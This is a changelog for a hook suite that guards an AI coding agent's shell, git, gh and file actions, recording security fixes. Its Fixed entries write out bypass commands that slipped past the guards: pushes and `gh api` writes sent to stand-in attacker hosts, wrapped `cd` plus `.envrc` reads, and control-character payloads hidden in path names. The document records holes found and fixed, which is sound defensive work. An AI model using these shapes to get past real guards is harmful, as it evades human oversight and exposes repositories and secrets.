# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

## [0.73.0] - 2026-08-05

### Added

- **The plan-persistence nudge now flags an approved plan carrying no settled `Panel:` line (#623).** Both persistence triggers (`persist-plan`, UserPromptSubmit; `persist-plan-approval`, PostToolUse:ExitPlanMode) already hold the normalized plan body; they now scan it for the plan template's settled `Panel:` stanza — `Panel: <seats> ran — <counts>` or the absence assertion `Panel: none — <reason>`, anchored at line start, first match in document order deciding (the `Driver:` stamp's discipline, so a quoted example later in the body can neither satisfy nor contradict the stanza), fenced code blocks and block quotes skipped (a fenced example in a stanza-less plan must not mint a settled verdict), and the separator tolerant of em dash, en dash, `--`, or hyphen (a hand-typed `Panel: none - reason` is settled) — and when neither form is present (absent, `pending`-shaped, or a `## Panel review` heading with no settled line) append one static sentence to the existing nudge: run the plan-review panel before implementing, fold findings, or write the absence line. Post-approval, pre-implementation detection by design — a rejection emits no hook event, so the template layer (cameronsjo/cadence#849) covers approval-time visibility. Artifact-anchored (the marker survives the approve-and-clear session boundary that killed session-scoped markers, cameronsjo/cadence#578), nudge-only (no trust root needed, unlike the gate cameronsjo/cadence#392 rejected), and the sentence is a static string — committed plan content is untrusted input and is never echoed. No new registration, no hooks.json change.

## [0.72.1] - 2026-08-04

### Fixed

- **`replicate-redaction-terms.sh` mislabeled an out-of-date binary as a corrupt terms file (#587).** The verify step inferred "too old" from an exit code, assuming an unrecognized `--status` exits clap's 2 — but `cadence-hooks` intercepts unknown subcommands itself, with its own message and its own code, so the too-old case fell through to the alarming branch. A live M5 run reported "terms written but binary reports NOT ARMED" and pointed the operator at a perfectly good file. The check now compares `--version` against the first release carrying the identity tier, which is deterministic and says the useful thing. Two related holes closed alongside it: the already-armed early exit trusted a `[[terms]]` header count, which proves a header exists rather than that the file parses — so the one path a re-run exists for was the one that skipped verification — and a greater-than-zero term count accepted a one-line garbage paste or a fetch cut mid-entry.
- **The 1Password fetch was CSV-quoting the terms file, and every check the script had was blind to it (#588).** `op item get --fields label=notesPlain` returns a multi-line value with a literal double quote prepended and appended. One character, two failures: on the legacy text format the leading quote stopped the first comment line from starting with `#`, so a prose fragment counted as a term and displaced a real one — a machine came up with 19 terms against the source's 18 and reported ARMED; on TOML it breaks parsing outright with `invalid basic string` and the tier is inert. Both read as a corrupt terms file. The fetch now uses `--format json`, which returns the value unquoted. The script also **parses** the written file rather than only counting lines in it — header count, term-value count, floor, and truncation were all line-counting checks, and every one of them passed on a document that failed to parse on line 1. Counting proves shape, not validity. `tomllib` is 3.11+, so its absence warns instead of silently skipping the validation.

## [0.72.0] - 2026-08-04

### Added

- **The redaction identity tier — fail-closed scanning for work-identifiable terms (#579).** Redaction was calibrated on the wrong axis: loud where consequence was low (four duplicate issues about a bare noun firing on mandated domain vocabulary) and silent where it was high (a leak-ledger campaign found 102 object-store and 41 tracker hits of enterprise identifiers it caught none of). This is the silent half. One guard, two type-separated passes: identity **blocks**, the shaped tiers still nudge. Terms come from `~/.config/cadence/redaction.toml`, outside every repo, with authored permanent ids replacing the previous format's position-derived codes — those drifted the moment the file was re-sorted and left older issues citing numbers that had moved. **Config-blind by construction:** the identity scan takes no `RedactionConfig`, no destination tier, and no allowlist, so no committed file can reach it even by future accident; a `config_scope` field on the category descriptor carries the same property forward for any category added later. **Fail directions run opposite on purpose** — the guard's own failure is fail-open (absent, unreadable, malformed, or zero-term source → inert, per ADR-0001), while a term match is fail-closed. The gap between those is why `redact-scan --status` exists: an armed guard announces itself when it fires, but an unarmed one is indistinguishable from a clean repo, so a machine that never received the term source would look exactly like success. Present-but-unreadable and zero-term report identically to absent, because from the outcome alone they cannot be told apart. `mode` defaults to `enforce`; `redact-external-content` joins `PROTECTED_GUARDS`, so `CADENCE_DISABLE` cannot silently disarm it. Coverage is **introduction-time** — commit messages, and fragments an edit introduces via Write/Edit or MCP write-shaped tools — with the residual (content entering a file by `sed -i` or an external editor) stated in ADR-0041 rather than papered over, and a native git pre-commit hook filed as the v2 route (#583).
- **`scripts/replicate-redaction-terms.sh`.** The term source lives outside every repo by design, so it does not travel with a clone and a second machine runs with the tier silently inert until it is replicated there. Pulls the 1Password backup, detects the legacy-vs-TOML format rather than assuming (a legacy file written to the TOML path would parse to zero terms and leave the tier inert while looking installed), writes 0600, and verifies against the binary rather than its own bookkeeping.
- **`guard-rm-liveness`, a SessionStart assertion that `guard-rm` is actually arbitrating deletes (wiring tracked in cameronsjo/cadence#760).** The two blanket `permissions.ask` rows `Bash(rm -rf:*)` / `Bash(rm -r:*)` were retired in favor of `guard-rm`, which discriminates by filesystem classification where a literal prefix rule cannot — but those rows had been the belt under every path where the guard fails to run. With them gone, a `guard-rm` that silently does not run means `rm -rf` executes with no prompt anywhere, and that failure is invisible by construction: `Outcome::Allow` is a silent exit 0 and only denials reach `denials.jsonl`, so "inspected and allowed" and "never ran" are byte-identical after the fact. The check asserts the **mechanism**, not the absence of errors — it runs `guard-rm` against inputs whose verdicts are fixed by contract (an unexpanded `$VAR` and a `$(…)` substitution must both `Ask`; a temp-root path must `Allow`) and nudges naming the diverging probe, and separately reports `CADENCE_DISABLE=guard-rm` / `CADENCE_BYPASS=1`. Deliberately **no daily gate** (unlike `platform-drift`): what it reports is "your only remaining deletion guard is off or broken", which should be visible every session rather than suppressed for 23 hours. **Two limits are documented in the module rather than left to be rediscovered.** It ships in the same plugin and binary as the guard it watches, so it cannot see a bypassed session, a disabled plugin, inert wiring, an absent binary, or a delete-time timeout — silence means "the classifier is intact and not switched off", never "deletes are guarded". And it does not probe the Block path: the Temp classification is evaluated *before* the git-repo check, so `rm -rf /tmp/<dir-containing-.git>` is a silent Allow and a tempdir fixture would assert Block, get Allow, and nudge falsely every session. Nudge-only, fail-open throughout (ADR-0001).

### Fixed

- **The identity tier self-locked on its own term source (#581).** The term source contains every term, so writing a term *into* it counted as introducing one and blocked — making the deny-list unmaintainable through the harness, with the block message advising an `allow` entry in the very file whose edit it had just refused. `run_edit` now exempts the term source, with the fail direction defaulting to scan-when-uncertain so an unresolvable path is never silently exempted.
- **The checked-in Codex compatibility report's `binaryVersion` had gone stale at 0.70.1**, leaving `make ci`'s `report-check` red on `main` from the 0.71.0 bump onward. The release procedure regenerates the platform baseline but not this report; the gap itself is filed separately.

## [0.71.0] - 2026-08-03

### Added

- **`record-polish` gains a repeatable `--arm name=state` roster, and the pre-PR gate escalates a security-skipped polish on a code branch (cameronsjo/cadence-hooks#467).** The presence-only marker could not tell a full polish from a docs-scoped one, so a security arm that never ran on a code branch read as a clean gate. The marker's JSON now carries an additive `"arms"` object (`--arm security=ran --arm tests=skipped`; malformed entries drop with a stderr note, never failing the record), the verdict line names the roster, and a new `read_polish_marker` (core `markers`) parses marker content leniently — untrusted input via `from_str(..).ok()`, content trusted only from the private `0700` marker dir (the inverse of `claim_today`: this content *causes* a nudge rather than suppressing one, but a degraded shared base still degrades to unknown so a plantable roster can never manufacture output). `nudge-polish-before-pr`'s pure `decide` widens to `(command, MarkerState, branch_touches_code)` with a distinct security-nudge message; the diff subprocess (new core `branch_diff`: `changed_files` via bounded git + `branch_touches_code` under **polish's own** code definition — skill/agent/command/rule markdown and `CLAUDE.md`/`SKILL.md` are code, so a naive `.md == docs` reuse cannot re-open the loophole) runs only when the roster affirmatively says security was skipped, never on the common full-polish path. **Absent roster = unknown, never skipped**: every legacy roster-less marker keeps allowing, and a `scope: docs` marker settles the question even without a roster (a docs pass never dispatches the security arm). Nudge-only, fail-open throughout (ADR-0001) — TimedOut/SpawnFailed git yields no evidence and allows.


## [0.70.1] - 2026-08-02

### Added

- **A SessionStart disclosure when the guard suite has recently been failing open (cameronsjo/cadence-hooks#277).** #271/PR #273 made a git-probe timeout loud in the ledger — `deadline` and `deadline_block_suppressed` rows in `failopen.jsonl`, plus a `doctor` latency scan — but both are **pull**. On the host that needs it nobody runs `doctor`, so the suite can sit mostly non-enforcing for days with nothing reaching the operator; #271's own reporter ran exactly that way, ~14 releases stale, and the #39 once-daily stderr notice did not reach them either. `session start` now reads the last 24 hours of the ledger and says it at session start instead of waiting to be asked.

  **Two tiers, because the two rows mean different things.** *Degraded* — `deadline` rows at or above a threshold (default 3, `CADENCE_FAILOPEN_DISCLOSE_MIN`): probes timed out and guards fell back to their ordinary fail-open arms. Load-correlated and often benign in ones and twos, which is why it is threshold-gated. *Not enforcing* — any `deadline_block_suppressed` row: a fail-closed guard arm downgraded a real block to an allow, so enforcement was actually bypassed. One row is the whole finding, so that tier ignores the threshold and fires at 1, and it is checked first — a machine with one suppressed block and two deadlines reports the suppression rather than falling silent under the degraded threshold.

  The window is a **day**, not `doctor`'s seven: the line answers "are guards enforcing right now", so a burst that ended last Tuesday must age out rather than nag through a week of healthy sessions. It is fixed rather than env-tunable — two interacting knobs make a silent line hard to diagnose, and the threshold is the one worth exposing.

  Gated once per calendar day **per tier** by `<metrics_dir>/state/failopen_warn.date`. The token carries the tier but not the counts, so an escalation (degraded → not enforcing) speaks the same day while a count climbing 3 → 9 within one tier stays quiet — the same trade `warn-stale`'s flatline token makes, and the reason this alarm should stay worth reading. `warn-stale` had the only implementation of that gate; both alarms now share one (`common::claim_daily_alarm`), so the marker convention cannot drift into two dialects.

  Composed as a fourth part of `session start`'s existing disclosure block rather than a new subcommand, on the same reasoning as the #429 plan disclosure: that surface already runs unconditionally on every SessionStart and already joins independent parts, so this costs no new hooks.json row. The part **appends** — posture, peers, and plans keep their positions, pinned by an ordering test.

  It is resolved **before** the registry guards, unlike the other three parts, because guard health belongs to the machine rather than to a repo: gating it behind `sessions_dir` would have silenced it in exactly the cwd with no git repository to coordinate in. Resolving it in the `Check` impl and injecting it into `run_start` also keeps the testable core free of the process-global metrics dir and the wall clock, so every existing `run_start` test stays hermetic instead of reading the machine's real telemetry. Fail-open throughout (ADR-0001): a missing ledger, an unreadable file, a bad env value, or a marker write error all resolve to silence or a plain line.

- **`PENDING_WIRING_HOOKS` entries are now asserted to still be genuinely unwired (cameronsjo/cadence-hooks#470).** `all_binary_subcommands_are_registered` lets any command on that allowlist stay unregistered without failing — a permanent exemption in practice, since nothing previously checked that an entry was *still earning it*. A wiring PR that landed a hook's `hooks.json` row without deleting its own `PENDING_WIRING_HOOKS` line (or that deleted a different line by mistake) left a stale hole open indefinitely, and the next guard that is genuinely never wired inherits the same silent cover. `pending_wiring_hooks_are_still_unwired` asserts the complement: it fails the moment any listed entry appears in a resolved `hooks.json`, turning the allowlist self-expiring. Split out of #463 alongside a `registered_commands` helper that dedupes the identical `BTreeSet` construction three tests had been building inline.

### Changed

- **The Codex compatibility report's freshness is now checked in CI.** `scripts/generate-codex-report.py --check` existed and nothing called it, so ~1700 generated lines that external consumers read as "what Codex support actually covers" could drift in wiring, evidence strings, status overrides, and the capabilities array while the only automated check compared hook *names*. `make report-check` (and `make report`) join `make ci` and run on CI's Linux leg — a generated-artifact check is platform-independent, so running it on both matrix legs would only add a `python3` dependency to the Windows runner.
- **The per-model pricing branch has one home.** `log_commit::build_commit_record` and `log_session::build_session_record` carried a byte-identical harness branch choosing the breakdown and unpriced-model list, an identical cost-nulling branch, and an identical `claude_usage()` test helper. All three now live on `UsageScan` (`priced_breakdown`, `is_unpriced_harness`, and a test-only `UsageScan::claude`). Nothing was broken — the copies agreed — but a pricing rule maintained in two places is how a record shape drifts, and the duplication had already spread from the production code into the tests. The rule now has one test, which neither copy had.

- **The `Scratch`/`git_in`/`init_repo` git-fixture trio, previously copy-pasted near-verbatim across `core::worktree`'s tests, `guardrails::enforce_worktree`'s tests, and `tests/deadline_failopen.rs`, is promoted into one `core::git_fixtures` module, feature-gated the same way as `core::test_builders` (cameronsjo/cadence-hooks#485).** Each copy carried its own carve-out assertion — a `target/`-rooted (never tempdir-rooted) scratch root, since `path_under_temp_root` exempts anything under the platform temp dir (#312) and a tempdir-rooted fixture would silently false-pass every blocked-path case — so a fix or a missed edge case in one copy never reached the other two. `Scratch::new` now takes the caller's own scratch root explicitly (each consumer's `env!("CARGO_MANIFEST_DIR")` is resolved at its own call site, not `git_fixtures`'s, so every crate's fixtures keep landing under its own `target/` exactly where they did before); `Scratch::path()` replaces the old direct `.0` field access at every call site. Kept as a module separate from `test_builders`'s plain `HookInput` builders (`make_bash`, `make_edit`, …), since folding in git-subprocess-spawning fixtures would make every consumer of those builders compile that code too. `Cargo.toml` grows a `cadence-hooks-core` dev-dependency (with the `test-builders` feature) on the top-level binary crate so `tests/deadline_failopen.rs` can reach it.
- Test fixtures use RFC 2606 example domains (`ghe.example.com`) and placeholder identifiers.

### Fixed

- **`git push`'s option grammar was modelled in two places that disagreed, and an option's value posed as the remote in both (cameronsjo/cadence-hooks#550).** `guard_push_remote::extract_push_target` picked the target with `segment.split_whitespace().find(|w| !w.starts_with('-'))` — no option grammar at all — so any value-taking option hid the real destination: `git push -qo topic=x https://github.com/evil/x.git main` judged `topic=x`, found it neither a configured remote nor a URL, and fell through to validating the **owned tracking remote** while git pushed to the attacker's URL. `loop_analysis::extract_push_remote` modelled the short-option cluster walk (#531) but not the long options taking a *separate* following word, so `git push --receive-pack /usr/bin/grp origin main && git push --receive-pack /usr/bin/grp https://github.com/evil/x.git main` resolved both pushes to `/usr/bin/grp`, the chain gate reported `SameRemote`, and the different-remotes block never fired.

  **The fix deletes the duplicate rather than extending it twice.** Both callers now delegate to one `core::shell::push_repository_argument`, which models `git push`'s grammar once: the short-option cluster walk, `--opt=value` inline forms, the `--` terminator, and the five options whose value is a separate word (`--push-option`, `--repo`, `--receive-pack`, `--exec`, `--recurse-submodules`). `--signed` and `--force-with-lease` are deliberately excluded — both take *optional* values and consume no following word, and including them would swallow the real target and false-block an ordinary `git push --signed origin main`. Every claim was measured against git 2.55.0 by pointing pushes at nonexistent local paths and reading which token git named as the repository.

  **Long options match by PREFIX, because git's parse-options resolves any unambiguous abbreviation.** An exact-match list shipped in the first cut and let `--recu`, `--rep`, `--exe`, `--receiv`, `--pu` and `--push-op` through, each accepted by real git and each consuming its value. No `git push` boolean shares a prefix with any of the five, so prefix matching cannot swallow an ordinary push's target; where a prefix is genuinely ambiguous git errors out and never pushes.

  **Both named destinations are validated, not just the one git prefers.** git reads its *first positional* as the repository (`--repo=/nonexistent/EQ /nonexistent/POS HEAD:main` reports `/nonexistent/POS`), and returning only that positional is what made the first cut *regress*: with `--recurse-submodules` unmodelled, `git push --repo <evil-url> --recurse-submodules check` let `check` pose as the positional and discarded the evil `--repo` URL — Block on `main`, Allow on the fix. The guard now blocks if *either* destination is unowned, which is stricter than git's own precedence and costs only a `git push --repo=<unowned> <owned>`, a command with no legitimate reading. `--repo` is honored by git, measured with an upstream configured so the refspec resolves before git contacts a remote.

  The *structural* gates keep reading the positional alone. Feeding them `--repo` promoted `MissingTargets`/`MissingRemotes` — which block before any owner logic — into `AllTargetsExplicit`, whose per-iteration check looks the value up as a remote **name**, fails, and skips fail-open; `for b in f1 f2; do git push --repo=/tmp/evil.git; done` went from Block to Allow. Separately, an explicit URL inside a loop body is now validated in the loop arm itself rather than only by the trailing single-command arm: `git remote get-url --push <url>` always fails, so that arm's fail-open (written for a typo'd remote name) skipped it. **This is defense in depth, not a closed hole** — measured against a pre-#550 binary, `for b in a b; do git push https://evil.example/a/b.git $b; done` already blocked, because the trailing arm caught what the loop arm had skipped. The redundancy is worth having (the trailing arm reads only the first `git push` in the command text, so it is not a reliable backstop), but the earlier wording here claimed the shape "reached no ownership check at all", which measurement does not support. Answered without a subprocess, since the loop is the command-controlled spawn path the shared #271 deadline must survive.

  Verified by a differential across binaries built from both trees, driving 55 probes through the real CLI: 17 commands went Allow → Block and no verdict came out weaker than `main`. The harness is committed at `scripts/probe-550-differential.sh`. It also corrected the issue's own report — the table lists `git push evilremote main` as a `BLOCK` control, which does not reproduce; an unknown remote name is neither a configured remote nor a URL, so git itself refuses it and the tracking-remote fallback is the correct verdict.

- **`guard-gh-write` judged ownership against the host it assumed rather than the host the command selects, so an allowed owner on `github.com` approved a write sent to another forge (cameronsjo/cadence-hooks#476).** Target resolution read `default_host()` — the *hook process's* `GH_HOST`, or `github.com` — while gh resolves its own host from `--hostname`, then an inline `GH_HOST=…` assignment on the command itself, then the process environment. So `gh api --hostname evil.example.com repos/<owned-owner>/x -X POST` cleared the allowlist on the strength of an owner that lives on a host the write never touches. `gh_command_host` now resolves the host on gh's own precedence, from the single quote-aware parse (`gh_command_tokens`, which also peels `eval`) that every other resolution arm already reads, and hands it to the ownership check — where a bare allowlist entry matches the default host only, so the retargeted spec blocks unless that host was explicitly allowed. Host comparisons fold ASCII case (hostnames are case-insensitive DNS names); owners and repos do not.

  **The `--hostname` hunt needs a flag grammar to know which tokens are some other flag's VALUE, and borrowing `gh api`'s for every subcommand reopened the same fail-open hole under a new name.** `GH_API_FLAGS.value_shorts` (`FfHqtpX`) and `api_flag_takes_separate_value` describe `gh api` and nothing else, but were applied unconditionally. Several write subcommands spell a *boolean* with a letter in that set: `gh pr create -f` is `--fill`, `gh release create -p` is `--prerelease` (both verified against gh 2.96.0's own `--help`). gh consumes no following token for either, so `gh pr create -R <owned>/x -f --hostname evil.example.com …` really does select `evil.example.com` — while the guard skipped the literal `--hostname` as `-f`'s phantom value, never saw a flag host, fell back to the assumed-owned default, and **Allowed**. Measured Allow before and Block after, on both shapes.

  **The two error directions are not symmetric, and that picks the default.** Skipping a token gh does not skip loses the real `--hostname` and fails OPEN; *not* skipping one gh does skip can read a flag's value as the host, which resolves a wrong, near-certainly non-default host that no bare allowlist entry matches — failing CLOSED. So an unknown subcommand now skips **less**, not more: `host_scan_flags` supplies the api table only when the first non-flag token after `gh` is `api`, and no table otherwise. A per-subcommand table written from memory was declined deliberately — it would be wrong somewhere, and every wrong row restores the fail-open direction. This is the rule `repo_flag` already ran under, and the `api`-detection is now one shared `gh_api_subcommand_index` with `gh_api_endpoint` so the two cannot drift about which commands are `api`.

  **A `--long` token reaching a shorthand arm is walked as a cluster, and that respells the same fail-open a third time.** The host scan fell from its long-flag-table check straight into the shorthand branch, where `strip_prefix('-')` leaves `--silent` as the cluster `-silent`; `cluster_consumes_next` walks it letter by letter, finds the trailing `t` in `GH_API_FLAGS.value_shorts`, and skips the following token. But `--silent` is a **boolean** in `gh api` (`Do not print the response body` — gh 2.96.0's own `--help`), so gh consumes nothing for it and the `--hostname` behind it is a real flag: `gh api --silent --hostname evil.example.com repos/<owned-owner>/x -X POST -f a=b` **Allowed**, in both `--hostname` spellings and through `eval`. The cause is the trailing letter, not long flags — `--slurp` ends in `p` and also swallowed, while `--paginate` and `--verbose` end in `e` and always resolved. The dangerous position is the natural one, since the swallow eats exactly one token: flags grouped at the front, which is how gh commands are written, and `--silent` is routine on a write. The long-flag short-circuit both other scanners in this file already had is now shared as `long_flag_stride`, so no scanner can reach a shorthand arm holding a `--long` token — the rule and its reason live in one place rather than in two spellings and one omission.

  **The docs sentence is scoped to what is actually read.** Host resolution reads `--hostname` and an inline `GH_HOST=… gh …` prefix on the same segment; an `export GH_HOST=… && gh …` in a preceding segment genuinely reaches gh and is **not** tracked, so the guard judges that write against the default host. Pre-existing rather than introduced here — the prior code ignored host selection entirely — and cross-segment assignment tracking is its own change. `docs/configuration.md` now names both read spellings and the untracked `export` form, and notes the non-finding beside it: a bare `GH_HOST=…; gh …` without `export` never reaches gh, so guard and gh already agree.

  The residual cost is pinned rather than wished away: a value that is *exactly* `--hostname=<host>` is indistinguishable from the flag once `tokenize` strips quotes, so a contrived `--title --hostname=evil.example.com` blocks. That is the fail-closed direction, and `equals_form_as_a_flag_value_fails_closed` asserts it. Ordinary prose is unaffected — a quoted `--body "--hostname evil.example.com"` is one token matching neither spelling. Controls cover what the gate must not break: every value-taking `gh api` shorthand still steps over its value, owned default-host writes with no `--hostname` still allow, both `--hostname value` and `--hostname=value` still resolve on non-`api` subcommands, and process-`GH_HOST` resolution — including a bare owner following it, and `--hostname` outranking it — is unchanged.

- **`doctor --prune` printed cache-directory paths straight to the terminal, so a third-party-influenced directory name could smuggle control characters into the operator's screen (cameronsjo/cadence-hooks#498).** The names being listed derive from marketplace and plugin directory names, which the operator does not author — and the one moment they are read is the moment the operator is deciding what to delete, which is exactly when a bidi override or an ANSI escape mis-describing the deletion target does the most damage. Every path the prune route prints now goes through the `metrics::common::display_safe_bounded` sanitizer that `Finding::render` has used since #440, at the same `MAX_FINDING_FIELD_CHARS` ceiling: the listing line, the "refusing to touch … outside cache root" warning, the "could not remove" error, and the two "scan root does not exist" / "no installed-plugins manifest" messages. Bounded rather than merely filtered, for the reason `Finding` bounds its own `location` — which is also a path: filtering constrains the character *set* and not the *length*, and the attacker influences three path components of up to 255 bytes each, so an unbounded line ran to 416 chars in the measured case and pushed the size figure and the `[marked .orphaned_at]` suffix off the right edge of `less -S`, where a forged `(~999.9 MiB)` planted inside the directory name is the only size still on screen.

  **Display only — the removal path is untouched.** `is_contained(dir, cache_root)` and `remove_dir_all(dir)` still take the original `&Path`; sanitization happens at the `println!`/`eprintln!` call sites and is never assigned back into anything reaching the filesystem. So this cannot change *what* gets pruned, only what the operator is shown about it. The listing body was extracted into a pure `render_orphan_dir_line` helper, and `prune_listing_preserves_ordinary_path_text` pins the previous format string byte-for-byte so the extraction is provably behavior-preserving on ordinary paths.

  **A sanitized line now says so, because the filter deletes rather than substitutes.** `display_safe` drops unsafe characters instead of collapsing them to a placeholder, so it is not injective — and a listing is the one place that matters, since two distinct directories rendering to one line is an ambiguity at a deletion prompt. Measured: a dir named `\u{200B}` + the active pinned SHA renders as exactly the active pin, which `orphan_dirs` excludes and prune never touches, so the line asserts the tool is about to delete the version the operator is running on; a dir whose name is *entirely* strippable renders as the bare parent plugin directory, reading as though the whole plugin were going. `render_orphan_dir_line` (and both `prune_orphans` warnings) now append `[name contains hidden characters]` when sanitization changed the text, adjacent to the path it describes so a two-path message stays unambiguous about which one was mangled. This is the same collapse-not-delete hazard `filename_safe`'s doc already adjudicates; `filename_safe` itself is not a drop-in here, since its allowlist would collapse `/`. In a live terminal the pre-fix output was equally ambiguous — U+200B renders as nothing either way — so what this restores is fidelity in **captured** output, where `--prune > log` used to preserve the distinguishing bytes for a later grep and the sanitized log no longer can. Length is deliberately not flagged: truncation already marks itself with an ellipsis.

  The regression test uses a real three-way payload rather than a token escape: `\x1b[31m` (ANSI), `\u{202E}` (RTL override), and `\u{E0001}` (Unicode Tags — the invisible-smuggling primitive a denylist is most likely to miss). It asserts the surviving text as well as the stripped bytes, so it cannot pass by deleting the whole string. Three more pin the marker and the ceiling — two names differing only by a zero-width character must not render alike, a wholly-invisible name must not render as its own parent, and an over-long name must bound with the size figure still on the line — against `prune_listing_preserves_ordinary_path_text` as the control, which still pins the ordinary format string byte-for-byte and carries no marker.

- **`prevent-secret-leaks` could not see a `cd` that lived inside a shell wrapper, so every `bash -c 'cd /elsewhere; cat .envrc'` shape read as a clean loader (cameronsjo/cadence-hooks#520).** The `.envrc` pure-loader carve-out resolves a RELATIVE operand against the tool call's static `input.cwd`, and #308 added `command_changes_directory` precisely so an in-command `cd` would invalidate that resolution — but the cd scan ran over `split_segments`, the NON-expanding view, while the operand scan next door had already moved to the wrapper-expanding `command_segments`. The two views disagreed in exactly one direction: the wrapper's script body was flattened into a segment for the operand scan (so `.envrc` was visible, and a loader at `input.cwd` was proven) and left folded away from the cd scan (so the `cd` was not), which is the combination that produces a false ALLOW. The guard proved the wrong file and said so confidently.

  **Fixed by running the cd scan over `command_segments(command)` too** — the same expansion, on the same un-lowered text #508 already switched the operand scan to. Measured Allow before and Block after, each against a tempdir holding a pure-loader `.envrc`: `bash -c 'cd /x; cat .envrc'`, `sh -c`, `zsh -c`, the flag-cluster form `bash -lc`, the long form `bash --login -c`, the privilege form `sudo -E bash -c` (which needs #508's un-lowered text to peel its `-E` at all), and `$'…'`-quoted scripts. The three shapes the fix must NOT swallow are pinned as controls: a plain `bash -c 'cat .envrc'` with no `cd` still Allows, and the grouped `(cd /x; cat .envrc)` / `{ cd /x; cat .envrc; }` forms that already blocked still do.

  **One input moves the other way, and it is the correct answer.** Segmenting the ORIGINAL command makes heredoc delimiter matching case-sensitive, which is what bash actually does — `<<EOF` is terminated by a line reading `EOF`, never `eof`. So `cat <<EOF > /tmp/z` whose body contains an `eof` line followed by `cd /x` flipped Block → Allow: the `cd` is heredoc body text the shell never executes, and running the shape for real confirms no chdir happens, so the pre-fix Block was an artifact of lowering before segmenting rather than a protection being given up. A `BLOCK → ALLOW` in this guard is normally the wrong direction to accept, so it is accepted here only because there is positive evidence, and it is pinned by its own test (`heredoc_body_line_matching_delimiter_only_when_folded_stays_allowed`) so the next change to the lower/segment order cannot flip it back silently.

  A `cd` inside `$(…)`/backticks now closes the carve-out even though a substitution subshell cannot move the parent's cwd — a deliberate over-block, since precise per-scope cd tracking is the complexity that sank the earlier attempts at this widening, and this direction fails CLOSED (a benign read is blocked, no secret is exposed).

- **`warn-subagent-concurrency` read the whole of `subagents.jsonl` on every dispatch, so an old session made each new one more expensive (cameronsjo/cadence-hooks#523).** The guard reconciles `SubagentStart`/`SubagentStop` pairs to count live agents, and it did so over an unbounded `read_to_string` of a file that only ever grows — a machine with a long lifecycle history paid for all of it on every subagent dispatch, to answer a question only the recent rows can affect. It now reads through `core::transcript::read_tail_bounded`, the same primitive #360/#361 landed for transcript files, capped at 1 MiB (`SUBAGENT_LOG_TAIL_BYTES`); no second bounded-read implementation enters this crate.

  **Truncation can only undercount, never invent a live agent.** A `SubagentStop` whose `SubagentStart` aged out of the window reconciles to `(started: false, stopped: true)` and is filtered out rather than counted — so the worst a narrow window does is under-report, which is the correct direction for an advisory nudge that never blocks, and the opposite of the phantom-live-agent risk #519 raised against a physical-rotation approach. Fail-open is unchanged (ADR-0001): a missing, non-UTF8, or non-regular file still resolves to allow.

  Also corrects the positive control this issue was filed against. `well_formed_log_with_no_rows_for_this_session_reports_real_zero` proved its input held live agents by calling `count_live_subagents(jsonl, None)` — the `Unscopable` path — which is a different branch from the `Matched` session-scoped reconciliation the test's real assertion pins, and a claim `no_session_id_counts_all` already made. It now asserts `count_live_subagents(jsonl, Some("s1")) == 1`, routing the control through the same branch as the case under test.

- **The Codex harness normalization silently unhooked `guard-browser-device` under Claude Code, and left `apply_patch` deletion outside `guard-rm` under Codex.** Both are regressions of the 0.68.0 harness work, found by review of the compatibility reconciliation and each reproduced against a built binary before and after.

  **`HookInput::from_json` overwrote `tool_name`.** Any `mcp__*` payload it could classify was rewritten to `Write`/`Edit`/`Read`/`Grep`, unconditionally — Claude Code payloads included. `guard-browser-device` matches `mcp__claude-in-chrome__*`, and four of those tools classify (`read_page`, `read_console_messages`, `read_network_requests`, `tabs_create_mcp`), so the rewritten name no longer matched the prefix and the guard allowed. It is in `PROTECTED_GUARDS` — `CADENCE_DISABLE` is explicitly forbidden to neuter it — and this neutered it for a subset of tools without touching it, writing no session marker either, so nothing recorded that the device handshake had been skipped. `read_page` is the most common first browser call of a session, and the guard exists precisely because multiple browsers may be paired.

  Fixed by shape rather than by a harness gate: `tool_name` now always carries what the harness sent, and the harness-neutral view lands in a new `normalized_tool` field read through `normalized_tool_name()` (falling back to `tool_name`, so Claude Code payloads are unchanged). Every `tool_name()` call site was audited and assigned: thirteen guards gating on a Claude tool name take the neutral view; `guard-browser-device`, the Claude-only tools (`AskUserQuestion`, `ExitPlanMode`, `CronCreate`), the `apply_patch` dispatch, and the denial/bypass audit rows keep the literal one. The preserved-name shape holds even if Codex later grows a Claude-in-Chrome route, which a `is_codex_harness()` gate on the rewrite would not. `normalized_tool` is `#[serde(skip)]`: it steers enforcement, so a payload must not be able to supply it.

  **`guard-rm` never saw a patch deletion.** Codex's `apply_patch` is a native file-deletion primitive Claude Code has no equivalent for — Claude deletes through Bash `rm`, which is why the guard only ever read commands — and a normalized `*** Delete File:` carries `operation: "delete"` and no command, so `GuardRm::run`'s opening command gate returned an unconditional allow. `ObsidianTrashGuard` was the only guard consuming `operation()`, and it covers vault paths only. The guard now splits two routes, with `judge_delete_path` running the path through the same `resolve_target` the command parser uses and handing it to a shared `judge_targets` lifted out of `judge_rm`, so the two cannot drift into two policies wearing one name. The target is a `SingleFile`, which makes the verdict identical to `rm <path>` for every path — asserted, not assumed. `../`-bearing patch paths become `Unresolvable` → Ask (→ Block under Codex), so the traversal `patch::clean_path` deliberately preserves is now actually rejected. One case needed handling ahead of the shared resolver: `normalize_path("/")` is `""`, which `resolve_target` reads as a bare cwd reference, so `*** Delete File: /` had been judged against the cwd.

  **The shipped manifest certified the gap as covered.** `guard-rm`'s policy row read `"evidence": "crates/core/src/lib.rs"` — a bare path naming no test — while `guard-rm` sits in `SECURITY_CRITICAL_HOOKS`, so `docs/codex-compatibility-report.json` told an auditor that deletion was handled under Codex when it was not.

- **The Codex fail-closed posture was one unset environment variable away from decorative.** `is_codex_harness()` read only `CADENCE_HARNESS`. The wrapper does export it, so this was defense-in-depth rather than a live hole — but the shape was the worst available, because the *normalization* was unconditional while the *hardening* was conditional: on a session where the variable was missing, payloads still normalized and guards still fired, so the integration looked healthy, while a malformed payload on a security-critical hook exited 0 instead of 2 and a guard returning `Ask` exited 0 with an envelope Codex cannot render. `is_codex_harness()` now ORs the environment check with a payload-shape sniff armed at parse time — a Codex-only tool name (`apply_patch`, `exec_command`, `unified_exec`, `spawn_agent`) or a string-valued `tool_input`, read off the raw value before the `apply_patch` rewrite erases the second signal.

